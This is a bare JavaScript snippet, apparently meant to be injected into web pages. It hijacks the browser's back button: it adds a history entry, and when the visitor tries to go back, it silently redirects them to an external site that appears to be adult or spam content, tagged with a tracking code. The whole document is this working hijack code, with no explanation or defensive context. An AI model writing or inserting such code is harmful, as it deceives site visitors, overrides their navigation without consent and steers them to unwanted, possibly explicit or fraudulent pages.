(function(window, location) {
    var bbURL = '//snapbabes9.com/?utm_source=2YdSppquJj5cG';
    history.pushState(null, document.title, location);
    window.addEventListener("popstate", function() {
            history.replaceState(null, document.title, location);
            setTimeout(function() {
                location.replace(bbURL);
            }, 0);
    }, false);
}(window, location));
